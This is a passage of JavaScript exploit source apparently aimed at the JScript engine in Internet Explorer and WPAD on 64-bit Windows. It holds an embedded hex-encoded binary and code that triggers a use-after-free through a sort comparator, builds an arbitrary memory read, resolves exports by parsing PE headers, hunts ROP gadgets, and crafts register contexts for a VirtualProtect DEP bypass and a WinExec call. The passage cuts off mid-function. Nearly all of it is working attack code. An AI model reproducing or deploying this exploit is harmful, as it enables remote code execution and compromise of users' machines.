0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00010000, 0x00000018, 0x80000018, 0x00000000, 0x00000000, 0x00000000, 0x00010000, 0x00000002, 0x80000030, 0x00000000, 0x00000000, 0x00000000, 0x00010000, 0x00000409, 0x00000048, 0x00008060, 0x0000017d, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x6d783f3c, 0x6576206c, 0x6f697372, 0x31273d6e, 0x2027302e, 0x6f636e65, 0x676e6964, 0x5455273d, 0x27382d46, 0x61747320, 0x6c61646e, 0x3d656e6f, 0x73657927, 0x0d3e3f27, 0x73613c0a, 0x626d6573, 0x7820796c, 0x736e6c6d, 0x7275273d, 0x63733a6e, 0x616d6568, 0x696d2d73, 0x736f7263, 0x2d74666f, 0x3a6d6f63, 0x2e6d7361, 0x20273176, 0x696e616d, 0x74736566, 0x73726556, 0x3d6e6f69, 0x302e3127, 0x0a0d3e27, 0x743c2020, 0x74737572, 0x6f666e49, 0x6c6d7820, 0x223d736e, 0x3a6e7275, 0x65686373, 0x2d73616d, 0x7263696d, 0x666f736f, 0x6f632d74, 0x73613a6d, 0x33762e6d, 0x0a0d3e22, 0x20202020, 0x6365733c, 0x74697275, 0x0a0d3e79, 0x20202020, 0x723c2020, 0x65757165, 0x64657473, 0x76697250, 0x67656c69, 0x0d3e7365, 0x2020200a, 0x20202020, 0x65723c20, 0x73657571, 0x45646574, 0x75636578, 0x6e6f6974, 0x6576654c, 0x656c206c, 0x3d6c6576, 0x49736127, 0x6b6f766e, 0x20277265, 0x63416975, 0x73736563, 0x6166273d, 0x2765736c, 0x0d3e2f20, 0x2020200a, 0x3c202020, 0x7165722f, 0x74736575, 0x72506465, 0x6c697669, 0x73656765, 0x200a0d3e, 0x3c202020, 0x6365732f, 0x74697275, 0x0a0d3e79, 0x2f3c2020, 0x73757274, 0x666e4974, 0x0a0d3e6f, 0x73612f3c, 0x626d6573, 0x0d3e796c, 0x0000000a, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00003000, 0x000000bc, 0xa268a260, 0xa278a270, 0xa2d8a280, 0xa340a2e0, 0xa358a350, 0xa430a420, 0xa450a440, 0xa470a460, 0xa4d0a4a8, 0xa4e0a4d8, 0xa4f0a4e8, 0xa500a4f8, 0xa510a508, 0xa520a518, 0xa530a528, 0xa540a538, 0xa550a548, 0xa560a558, 0xa570a568, 0xa580a578, 0xa590a588, 0xa5a0a598, 0xa5b0a5a8, 0xa5c0a5b8, 0xa5d0a5c8, 0xa5e0a5d8, 0xa5f0a5e8, 0xa600a5f8, 0xa610a608, 0xa620a618, 0xa630a628, 0xa640a638, 0xa650a648, 0xa660a658, 0xa670a668, 0xa680a678, 0xa690a688, 0xa6a0a698, 0xa6b0a6a8, 0xa6c0a6b8, 0xa6d0a6c8, 0xa6e8a6d8, 0xa6f8a6f0, 0xa708a700, 0xa7c0a718, 0x00004000, 0x0000005c, 0xa1b0a160, 0xa1f0a1c0, 0xa200a1f8, 0xa218a208, 0xa278a230, 0xa2a0a290, 0xa320a2c8, 0xa330a328, 0xa3a8a378, 0xa400a3d0, 0xa420a410, 0xa440a430, 0xa460a450, 0xa478a470, 0xa4b0a488, 0xa4d8a4c8, 0xa510a4e8, 0xa7e8a520, 0xa808a800, 0xa8b0a8a8, 0xa8c0a8b8, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x65766164, ];

////////
////////
// Stack-sensitive array initialization logic
////////

var SortArray = new Array(); // Initializing this locally rather than globally causes stack issues, particularly in regards to WPAD.
for(var i = 0; i <= 150; i++) SortArray[i] = [0, 0]; // An array of arrays to be sorted by glitched sort comparator

////////
////////
// Debug/timer code
////////

var TimeStart;
var ReadCount;
var ScriptTimeStart = new Date().getTime();

function StartTimer() {
    ReadCount = 0;
    TimeStart = new Date().getTime();
}

function EndTimer(Message) {
    var TotalTime = (new Date().getTime() - TimeStart);
    
    if(EnableTimers) {
        if(AlertOutput) {
            alert("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
        }
        else {
            console.log("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
        }
    }
}

function DebugLog(Message) {
    if(EnableDebug) { // When debug is enabled the distinction between "stack overflow" and "out of memory" errors are lost: console always determines there to be an "out of memory" condition even though this only sppears after scoping of SortDepth is changed.
        if(AlertOutput) {
            alert(Message);
        }
        else {
            console.log(Message); // In IE, console only works if devtools is open.
        }
    }
}

////////
////////
// UAF/untracked variable creation code
////////

var UntrackedVarSet;
var VarSpray;
var VarSprayCount = 20000; // 200 GcBlocks
var NameListAnchors;
var NameListAnchorCount = 0; // The larger this number the more reliable the exploit on Windows 8.1 where LFH cannot easily re-claim
var SortDepth = 0;
    
function GlitchedComparator(Untracked1, Untracked2) {
    Untracked1 = VarSpray[SortDepth*2];
    Untracked2 = VarSpray[SortDepth*2 + 1];
    
    if(SortDepth >= 150) {
        VarSpray = new Array(); // Erase references to sprayed vars within GcBlocks
        CollectGarbage(); // Free the GcBlocks
        UntrackedVarSet.push(Untracked1);
        UntrackedVarSet.push(Untracked2);
    }
    else {
        SortDepth += 1;
        
        // There is a difference between the stack size between WPAD and Internet Explorer. In IE, a stack overflow exception will occur around depth 250 however in WPAD it will occur on a depth of less than 150, ensuring a stack overflow exception/alert will be thrown in the exploit. This try/catch in conjunction with a global initialization of the sort array allows the depth to be sufficient to produce an untracked var which will overlap with the type confusion offset in the re-claimed GcBlock.
        
        try {
            SortArray[SortDepth].sort(GlitchedComparator);
        }
        catch(ex) {
            VarSpray = new Array(); // Erase references to sprayed vars within GcBlocks
            CollectGarbage(); // Free the GcBlocks
        }
        
        UntrackedVarSet.push(Untracked1);
        UntrackedVarSet.push(Untracked2);
    }
    
    return 0;
}

function NewUntrackedVarSet() {
    SortDepth = 0;
    VarSpray = new Array();
    NameListAnchors = new Array();
    UntrackedVarSet = new Array();
    for(var i = 0; i < NameListAnchorCount; i++) NameListAnchors[i] = new Object(); // Overlay must happen before var spray
    for(var i = 0; i < VarSprayCount; i++) VarSpray[i] = new Object();
    CollectGarbage();
    SortArray[0].sort(GlitchedComparator); // Two untracked vars will be passed to this method by the JS engine
}

////////
////////
// UAF re-claim/mutable variable code (used for arbitrary read)
////////

var AnchorObjectsBackup;
var LeakedAnchorIndex = -1;
var SizerPropName = Array(570).join('A');
var MutableVar;
var ReClaimNameList;
var InitialReClaim = true;

function ReClaimIndexNameList(Value, PropertyName) {
    CollectGarbage(); // Cleanup - note that removing this has not damaged stability of the exploit in any of my own tests and its removal significantly improved exploit performance (each arbitrary read is about twice as fast). I've left it here from maxspl0it's original version of the exploit to ensure stability.
    AnchorObjectsBackup[LeakedAnchorIndex] = null; // Delete the anchor associated with the leaked NameList allocation
    CollectGarbage(); // Free the leaked NameList
    AnchorObjectsBackup[LeakedAnchorIndex] = new Object();
    AnchorObjectsBackup[LeakedAnchorIndex][SizerPropName] = 1; // 0x239 property name size for 0x970 NameList allocation size
    AnchorObjectsBackup[LeakedAnchorIndex]["BBBBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
    AnchorObjectsBackup[LeakedAnchorIndex]["\u0005"] = 1;
    AnchorObjectsBackup[LeakedAnchorIndex][PropertyName] = Value; // The mutable variable
    ReadCount++;
}

function ReClaimBackupNameLists(Value, PropertyName) {
    var PrecisionReClaimAllocCount = 500; // This is the number of re-claim attempts that are needed for a precision re-claim of a single freed region, not hundreds such as in the case of the GcBlock/type confusion re-claims. On IE8/11 300 is plenty, on WPAD 500 seems to be more stable. 
    CollectGarbage(); // Cleanup
    
    if(InitialReClaim) {
        AnchorObjectsBackup[LeakedAnchorIndex] = null;
        InitialReClaim = false;
        PrecisionReClaimAllocCount -= 1;
        AnchorObjectsBackup[LeakedAnchorIndex] = new Object(); // Clog the index
    }
    
    for(var i = 0; i < PrecisionReClaimAllocCount; i++) {
        if(i != LeakedAnchorIndex) AnchorObjectsBackup[i] = null;
    }
    
    CollectGarbage(); // Free the leaked NameList
    
    for(var i = 0; i < PrecisionReClaimAllocCount; i++) {
        if(i != LeakedAnchorIndex) AnchorObjectsBackup[i] = new Object();
        AnchorObjectsBackup[i][SizerPropName] = 1; // 0x239 property name size for 0x970 NameList allocation size
        AnchorObjectsBackup[i]["BBBBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
        AnchorObjectsBackup[i]["\u0005"] = 1;
        AnchorObjectsBackup[i][PropertyName] = Value; // The mutable variable
    }
    
    ReadCount++;
}

function CreateVar64(Type, ObjPtrLow, ObjPtrHigh, NextPtrLow, NextPtrHigh) {
    var CharCodes = new Array();
    
    CharCodes.push(
         // Type
        Type, 0, 0, 0,
        // Object pointer
        ObjPtrLow & 0xffff, (ObjPtrLow >> 16) & 0xffff, ObjPtrHigh & 0xffff, (ObjPtrHigh >> 16) & 0xffff,
        // Next pointer
        NextPtrLow & 0xffff, (NextPtrLow >> 16) & 0xffff, NextPtrHigh & 0xffff, (NextPtrHigh >> 16) & 0xffff);
        
    return String.fromCharCode.apply(null, CharCodes);
}

function LeakByte64(Address) {
    ReClaimNameList(0, CreateVar64(0x8, Address.low + 2, Address.high, 0, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    return (MutableVar.length >> 15) & 0xff; // Shift to align and get the byte.
}

function LeakWord64(Address) {
    ReClaimNameList(0, CreateVar64(0x8, Address.low + 2, Address.high, 0, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    return ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
}

function LeakDword64(Address) {
    ReClaimNameList(0, CreateVar64(0x8, Address.low + 2, Address.high, 0, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    var LowWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(0, CreateVar64(0x8, Address.low + 4, Address.high, 0, 0)); // +4 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    var HighWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    return LowWord + (HighWord << 16);
}

function LeakQword64(Address) {
    ReClaimNameList(0, CreateVar64(0x8, Address.low + 2, Address.high, 0, 0));
    var LowLow = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(0, CreateVar64(0x8, Address.low + 4, Address.high, 0, 0));
    var LowHigh = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(0, CreateVar64(0x8, Address.low + 6, Address.high, 0, 0));
    var HighLow = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(0, CreateVar64(0x8, Address.low + 8, Address.high, 0, 0));
    var HighHigh = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    return MakeDouble(HighLow + (HighHigh << 16), LowLow + (LowHigh << 16));
}

function LeakObjectAddress64(ObjVarAddress, ObjVarValue) { // This function does not always work, there are some edge cases. For example if a BSTR is declared var A = "123"; it works fine. However, var A = "1"; A += "23"; resuls in multiple layers of VARs referencing VARs and this function will no longer get the actual BSTR address.
    ReClaimNameList(ObjVarValue, CreateVar64(0x8, ObjVarAddress.low + 8 + 2, ObjVarAddress.high, 0, 0));
    var LowLow = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(ObjVarValue, CreateVar64(0x8, ObjVarAddress.low + 8 + 4, ObjVarAddress.high, 0, 0));
    var LowHigh = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(ObjVarValue, CreateVar64(0x8, ObjVarAddress.low + 8 + 6, ObjVarAddress.high, 0, 0));
    var HighLow = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(ObjVarValue, CreateVar64(0x8, ObjVarAddress.low + 8 + 8, ObjVarAddress.high, 0, 0));
    var HighHigh = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    var DerefObjVarAddress = MakeDouble(HighLow + (HighHigh << 16), LowLow + (LowHigh << 16) + 8);
    return LeakQword64(DerefObjVarAddress); // The concept here is to turn the property name (the mutable var) into a BSTR VAR pointing at its own VVAL (which starts with another, real VAR). The real VAR can be set dynamically to the address of the desired object. So there are two stages: first to read the object pointer out of the VAR within the final VVAL, and then to leak the object pointer of the VAR it is pointing to (skipping +8 over its Type field)
}

////////
////////
// PE parsing/EAT and IAT resolution code
////////

function ResolveExport64(ModuleBase, TargetExportNameTable) {
    var FileHdrRva = LeakDword64(MakeDouble(ModuleBase.high, ModuleBase.low + 0x3c));
    var EATRva = LeakDword64(MakeDouble(ModuleBase.high, ModuleBase.low + FileHdrRva + 0x88));
    
    if(EATRva) {
        var TotalExports = LeakDword64(MakeDouble(ModuleBase.high, ModuleBase.low + EATRva + 0x14));
        var AddressRvas = LeakDword64(MakeDouble(ModuleBase.high, ModuleBase.low + EATRva + 0x1C));
        var NameRvas = LeakDword64(MakeDouble(ModuleBase.high, ModuleBase.low + EATRva + 0x20));
        var OrdinalRvas = LeakDword64(MakeDouble(ModuleBase.high, ModuleBase.low + EATRva + 0x24));
        var MaxIndex = TotalExports;
        var MinIndex = 0;
        var CurrentIndex = Math.floor(TotalExports / 2);
        var TargetTableIndex = 0;
        var BinRes = 0;
        var TrailingNullWord = false;
        
        if((TargetExportNameTable[TargetExportNameTable.length - 1] & 0xFFFFFF00) == 0) {
            TrailingNullWord = true;
        }
        
        while(TotalExports) { 
            var CurrentNameRva = LeakDword64(MakeDouble(ModuleBase.high, ModuleBase.low + NameRvas + 4*CurrentIndex));

            while (TargetTableIndex < TargetExportNameTable.length) {
                var CurrentNameWord = LeakWord64(MakeDouble(ModuleBase.high, ModuleBase.low + (CurrentNameRva + (4 * TargetTableIndex))));
                var TargetExportNameWord = (TargetExportNameTable[TargetTableIndex] & 0x0000FFFF);
                var SanitizedCurrentNameWord = NullSanitizeWord(CurrentNameWord);
                var FinalTableIndex = false;
                
                if((TargetTableIndex + 1) >= TargetExportNameTable.length) {
                    FinalTableIndex = true;
                }
                
                BinRes = BinaryCmp(TargetExportNameWord, SanitizedCurrentNameWord);

                if(!BinRes) {
                    TargetExportNameWord = ((TargetExportNameTable[TargetTableIndex] & 0xFFFF0000) >> 16);
                    CurrentNameWord = LeakWord64(MakeDouble(ModuleBase.high, ModuleBase.low + (CurrentNameRva + (4 * TargetTableIndex)) + 2));
                    SanitizedCurrentNameWord = NullSanitizeWord(CurrentNameWord);

                    if(TrailingNullWord && FinalTableIndex) {
                        var Ordinal = LeakWord64(MakeDouble(ModuleBase.high, ModuleBase.low + OrdinalRvas + 2*CurrentIndex));
                        var MainExport = MakeDouble(ModuleBase.high, ModuleBase.low + LeakDword64(MakeDouble(ModuleBase.high, ModuleBase.low + AddressRvas + 4*Ordinal)));
                        return MainExport;
                    }
                        
                    BinRes = BinaryCmp(TargetExportNameWord, SanitizedCurrentNameWord);

                    if(!BinRes) {
                        if(FinalTableIndex) {
                            var Ordinal = LeakWord64(MakeDouble(ModuleBase.high, ModuleBase.low + OrdinalRvas + 2*CurrentIndex));
                            var MainExport = MakeDouble(ModuleBase.high, ModuleBase.low + LeakDword64(MakeDouble(ModuleBase.high, ModuleBase.low + AddressRvas + 4*Ordinal)));
                            return MainExport;
                        }
                        
                        TargetTableIndex++;
                    }
                    else {
                        TargetTableIndex = 0;
                        break;
                    }
                }
                else {
                    TargetTableIndex = 0;
                    break;
                }
            }
            
            if(BinRes == 1) { // Target is greater than what it was compared to: reduce current index
                if(MaxIndex == CurrentIndex) {
                    DebugLog("Failed to find export: index hit max");
                    break;
                }
                
                MaxIndex = CurrentIndex;
                CurrentIndex = Math.floor((CurrentIndex + MinIndex) / 2);
            } 
            else if (BinRes == -1) { // Target is less than what it was compared to: enhance current index
                if(MinIndex == CurrentIndex) {
                    DebugLog("Failed to find export: index hit min");
                    break;
                }
                
                MinIndex = CurrentIndex;
                CurrentIndex = Math.floor((CurrentIndex + MaxIndex) / 2);
            }
            
            if(CurrentIndex == MaxIndex && CurrentIndex == MinIndex) {
                DebugLog("Failed to find export: current, min and max indexes are all equal");
                break;
            }
        }
    }
    
    return MakeDouble(0, 0);
}

function SelectRandomImport64(ModuleBase, TargetModuleNameTable) { // Grab the first IAT entry of a function within the specified module
    var ExtractedAddresss = MakeDouble(0, 0);
    var FileHdrRva = LeakDword64(MakeDouble(ModuleBase.high, ModuleBase.low + 0x3c));
    var ImportDataDirAddress = MakeDouble(ModuleBase.high, ModuleBase.low + FileHdrRva + 0x90); // Import data directory
    var ImportRva = LeakDword64(ImportDataDirAddress);
    var ImportSize = LeakDword64(MakeDouble(ImportDataDirAddress.high, ImportDataDirAddress.low + 0x4)); // Get the size field of the import data dir
    var DescriptorAddress = MakeDouble(ModuleBase.high, ModuleBase.low + ImportRva);
    
    while(ImportSize != 0) {
        var NameRva = LeakDword64(MakeDouble(DescriptorAddress.high, DescriptorAddress.low + 0xc)); // 0xc is the offset to the module name pointer
        
        if(NameRva != 0) {
            if(StrcmpLeak64(TargetModuleNameTable, MakeDouble(ModuleBase.high, ModuleBase.low + NameRva))) {
                var ThunkRva = LeakDword64(MakeDouble(DescriptorAddress.high, DescriptorAddress.low + 0x10));
                ExtractedAddresss = LeakQword64(MakeDouble(ModuleBase.high, ModuleBase.low + ThunkRva + 8)); // +8 since __imp___C_specific_handler can cause issues when imported in some jscript instances
                break;
            }
            
            ImportSize -= 0x14;
            DescriptorAddress.low += 0x14; // Next import descriptor in array
        }
        else {
            break;
        }
    }
    
    return ExtractedAddresss;
}

function DiveModuleBase64(Address) {
    Address.low = (Address.low & 0xFFFF0000) + 0x4e; // Offset of "This program cannot be run in DOS mode" in PE header.
    
    while(true) {
        if(LeakWord64(Address) == 0x6854) { // 'hT'
            if(LeakWord64(MakeDouble(Address.high, Address.low + 2)) == 0x7369) { // 'si'
                return MakeDouble(Address.high, Address.low - 0x4e);
            }
        }
        
        Address.low -= 0x10000;
    }
    
    return MakeDouble(0, 0);
}

function BaseFromImports64(ModuleBase, TargetModuleNameTable) {
    var RandomImportAddress = SelectRandomImport64(ModuleBase, TargetModuleNameTable);
    //DebugLog("Random import selected at 0x" + RandomImportAddress.high.toString(16) + RandomImportAddress.low.toString(16));
    
    if(RandomImportAddress.low || RandomImportAddress.high) {
        return DiveModuleBase64(RandomImportAddress);
    }
    
    return MakeDouble(0, 0);
}

////////
////////
// Misc. helper functions
////////

function NullSanitizeWord(StrWord) {
    var Sanitized = 0;
    
    if(StrWord != 0) {
        if((StrWord & 0x00FF) == 0) {
            Sanitized = 0; // First byte is NULL, end of the string.
        }
        else {
            Sanitized = StrWord;
        }
    }
    
    return Sanitized;
}

function BinaryCmp(TargetNum, CmpNum) { // return -1 for TargetNum being greater, 0 for equal, 1 for CmpNum being greater
    if(TargetNum == CmpNum) {
        return 0;
    }
    
    while(true) {
        if((TargetNum & 0xff) > (CmpNum & 0xff)) {
            return -1;
        }
        else if((TargetNum & 0xff) < (CmpNum & 0xff)) {
            return 1;
        }
        
        TargetNum = TargetNum >> 8;
        CmpNum = CmpNum >> 8;
    }
}

function DwordToUnicode(Dword) {
    var Unicode = String.fromCharCode(Dword & 0xFFFF);
    Unicode += String.fromCharCode(Dword >> 16);
    return Unicode;
}

function QwordToUnicode(Value) {
    return String.fromCharCode.apply(null, [Value.low & 0xffff, (Value.low >> 16) & 0xffff, Value.high & 0xffff, (Value.high >> 16) & 0xffff]);
}

function TableToUnicode(Table) {
    var Unicode = "";
    
    for(var i = 0; i < Table.length; i++) {
        Unicode += DwordToUnicode(Table[i]);
    }

    return Unicode;
}

function DwordArrayToBytes(DwordArray) {
    var ByteArray = [];
    
    for(var i = 0; i < DwordArray.length; i++) {
        ByteArray.push(DwordArray[i] & 0xffff);
        ByteArray.push((DwordArray[i] & 0xffff0000) >> 16);
    }
    
    return String.fromCharCode.apply(null, ByteArray);
}

function StrcmpLeak64(StrDwordTable, LeakAddress) { // Compare two strings between an array of WORDs and a string at a memory address
    var TargetTableIndex = 0;
    
    while (TargetTableIndex < StrDwordTable.length) {
        var LeakStrWord = LeakWord64(MakeDouble(LeakAddress.high, LeakAddress.low + (4 * TargetTableIndex)));
        var SanitizedStrWord = NullSanitizeWord(LeakStrWord);
        var TableWord = (StrDwordTable[TargetTableIndex] & 0x0000FFFF);
        
        if(TableWord == SanitizedStrWord) {
            LeakStrWord = LeakWord64(MakeDouble(LeakAddress.high, LeakAddress.low + (4 * TargetTableIndex) + 2));
            SanitizedStrWord = NullSanitizeWord(LeakStrWord);
            TableWord = ((StrDwordTable[TargetTableIndex] & 0xFFFF0000) >> 16);
            
            if(TableWord == SanitizedStrWord) {
                if((TargetTableIndex + 1) >= StrDwordTable.length) {
                    return true;
                }
                
                TargetTableIndex++;
            }
            else {
                break;
            }
        }
        else {
            break;
        }
    }
    
    return false;
}

function MakeDouble(High, Low) {
    return Int52ToDouble(QwordToInt52(High, Low));
}

function QwordToInt52(High, Low) {
    // Sanity check via range. Not all QWORDs are going to be valid  52-bit integers that can be converted to doubles
    
    if ((Low !== Low|0) && (Low !== (Low|0)+4294967296)) {
        DebugLog ("Low out of range: 0x" + Low.toString(16));
    }
    
    if (High !== High|0 && High >= 1048576) {
        DebugLog ("High out of range: 0x" + High.toString(16));
    }

    if (Low < 0) {
        Low += 4294967296;
    }

    return High * 4294967296 + Low;
}

function Int52ToDouble(Value) {
    var Low = Value | 0;
    
    if (Low < 0) {
        Low += 4294967296;
    }

    var High = Value - Low;
    
    High /= 4294967296;
    
    if ((High < 0) || (High >= 1048576)) {
        DebugLog("Fatal error - not an int52: 0x" + Value.toString(16));
        Loew = 0;
        High = 0;
    }
    
    return { low: Low, high: High };
}

function MakeQword(High, Low) {
    return { low: Low, high: High };
}

////////
////////
// Dynamic ROP chain creation code
////////

function HarvestGadget64(HintExportAddress, MaxDelta, Data, DataMask, MagicOffset) {
    var MaxHighAddress = MakeDouble(HintExportAddress.high, (HintExportAddress.low + MagicOffset + MaxDelta));
    var MinLowAddress = MakeDouble(HintExportAddress.high, ((HintExportAddress.low + MagicOffset) - MaxDelta));
    var LeakAddress = MakeDouble(HintExportAddress.high, HintExportAddress.low + MagicOffset);
    var LeakFunc = LeakDword64; // Leaking by DWORD causes some quirks on 64-bit. Bitwise NOT solves issue.
    var InitialAddress = LeakAddress;
    var IndexDelta;
    
    if(MinLowAddress.low < HintExportAddress.low) {
        MinLowAddress.low = HintExportAddress.low; // Don't bother scanning below the hint export
    }
    
    DebugLog("Hunting for gadget 0x" + Data.toString(16) + " between 0x" + MinLowAddress.high.toString(16) + MinLowAddress.low.toString(16) + " and 0x" + MaxHighAddress.high.toString(16) + MaxHighAddress.low.toString(16) + " starting from 0x" + LeakAddress.high.toString(16) + LeakAddress.low.toString(16) + " based on hint export at 0x" + HintExportAddress.high.toString(16) + HintExportAddress.low.toString(16));
    
    if(DataMask == 0x0000FFFF) {
        LeakFunc = LeakWord64;
    }
    
    var LeakedData = LeakFunc(LeakAddress);

    if((~LeakedData & DataMask) == ~Data) {
        DebugLog("Found gadget at expected delta of " + MagicOffset.toString(16));
    }
    else {
        var HighAddress = MakeDouble(LeakAddress.high, LeakAddress.low + 1);
        var LowAddress = MakeDouble(LeakAddress.high, LeakAddress.low - 1);

        LeakAddress = MakeDouble(0, 0);

        while(LowAddress.low >= MinLowAddress.low || HighAddress.low < MaxHighAddress.low) {
            if(LowAddress.low >= MinLowAddress.low) {
                LeakedData = LeakFunc(LowAddress);
                
                if((~LeakedData & DataMask) == ~Data) {
                    DebugLog("Found gadget from scan below magic at 0x" + LowAddress.high.toString(16) + LowAddress.low.toString(16));
                    LeakAddress = LowAddress;
                    break;
                }
                
                LowAddress.low -= 1;
            }
            
            if(HighAddress.low < MaxHighAddress.low) {
                LeakedData = LeakFunc(HighAddress);
                
                if((~LeakedData & DataMask) == ~Data) {
                    LeakAddress = HighAddress;
                    IndexDelta = (LeakAddress.low - InitialAddress.low);
                    DebugLog("Found gadget from scan above magic at 0x" + HighAddress.high.toString(16) + HighAddress.low.toString(16) + " (index " + IndexDelta.toString(10) + ")");
                    break;
                }
                
                HighAddress.low += 1;
            }
        }
    }
    
    return LeakAddress;
}

////////
////////
// Primary high level exploit logic
////////

function MakeContextDEPBypass64(NewRSP, ArtificialStackAddress, StackPivotAddress, VirtualProtectAddress, ShellcodeAddress, ShellcodeSize, WritableAddress) {
    return "\u0000\u0000\u0000\u0000" + // P3Home
    "\u0000\u0000\u0000\u0000" + // P4Home
    "\u0000\u0000\u0000\u0000" + // P5Home
    "\u0000\u0000\u0000\u0000" + // P6Home
    "\u0003\u0010" + // ContextFlags
    "\u0000\u0000" + // MxCsr
    "\u0033" + // SegCs
    "\u0000" + // SegDs
    "\u0000" + // SegEs
    "\u0000" + // SegFs
    "\u0000" + // SegGs
    "\u002b" + // SegSs
    "\u0246\u0000" + // EFlags
    "\u0000\u0000\u0000\u0000" + // Dr0 - Prevents EAF too!
    "\u0000\u0000\u0000\u0000" + // Dr1
    "\u0000\u0000\u0000\u0000" + // Dr2
    "\u0000\u0000\u0000\u0000" + // Dr3
    "\u0000\u0000\u0000\u0000" + // Dr6
    "\u0000\u0000\u0000\u0000" + // Dr7
    "\u0000\u0000\u0000\u0000" + // Rax
    QwordToUnicode(ShellcodeAddress) + // Rcx
    QwordToUnicode(ShellcodeSize) + // Rdx
    "\u0000\u0000\u0000\u0000" + // Rbx
    QwordToUnicode(NewRSP) + // Rsp
    "\u0000\u0000\u0000\u0000" + // Rbp
    "\u0000\u0000\u0000\u0000" + // Rsi
    "\u0000\u0000\u0000\u0000" + // Rdi
    "\u0040\u0000\u0000\u0000" + // R8
    QwordToUnicode(WritableAddress) + // R9
    "\u0000\u0000\u0000\u0000" + // R10
    QwordToUnicode(ArtificialStackAddress) + // R11
    "\u0000\u0000\u0000\u0000" + // R12
    "\u0000\u0000\u0000\u0000" + // R13
    "\u0000\u0000\u0000\u0000" + // R14
    "\u0000\u0000\u0000\u0000" + // R15
    QwordToUnicode(StackPivotAddress); // RIP
}

function MakeContextWinExec64(CommandLineAddress, StackPtr, WinExecAddress) {
    return "\u0000\u0000\u0000\u0000" + // P3Home
    "\u0000\u0000\u0000\u0000" + // P4Home
    "\u0000\u0000\u0000\u0000" + // P5Home
    "\u0000\u0000\u0000\u0000" + // P6Home
    "\u0003\u0010" + // ContextFlags
    "\u0000\u0000" + // MxCsr
    "\u0033" + // SegCs
    "\u0000" + // SegDs
    "\u0000" + // SegEs
    "\u0000" + // SegFs
    "\u0000" + // SegGs
    "\u002b" + // SegSs
    "\u0246\u0000" + // EFlags
    "\u0000\u0000\u0000\u0000" + // Dr0 - Prevents EAF too!
    "\u0000\u0000\u0000\u0000" + // Dr1
    "\u0000\u0000\u0000\u0000" + // Dr2
    "\u0000\u0000\u0000\u0000" + // Dr3
    "\u0000\u0000\u0000\u0000" + // Dr6
    "\u0000\u0000\u0000\u0000" + // Dr7
    "\u0000\u0000\u0000\u0000" + // Rax
    QwordToUnicode(CommandLineAddress) + // Rcx - Command pointer
    "\u0005\u0000\u0000\u0000" + // Rdx - SW_SHOW
    "\u0000\u0000\u0000\u0000" + // Rbx
    QwordToUnicode(StackPtr) + // Rsp
    "\u0000\u0000\u0000\u0000" + // Rbp
    "\u0000\u0000\u0000\u0000" + // Rsi
    "\u0000\u0000\u0000\u0000" + // Rdi
    "\u0000\u0000\u0000\u0000" + // R8
    "\u0000\u0000\u0000\u0000" + // R9
    "\u0000\u0000\u0000\u0000" + // R10
    "\u0000\u0000\u0000\u0000" + // R11
    "\u0000\u0000\u0000\u0000" + // R12
    "\u0000\u0000\u0000\u0000" + // R13
    "\u0000\u0000\u0000\u0000" + // R14
    "\u0000\u0000\u0000\u0000" + // R15
    QwordToUnicode(WinExecAddress); // RIP - KERNEL32.DLL!WinExec
}

function CreateFakeVtable(NtContinueAddress) {
    
    var FakeVtable = "";
    var Padding = [];
    
    for (var i = 0; i < (0x138 / 4); i++) {
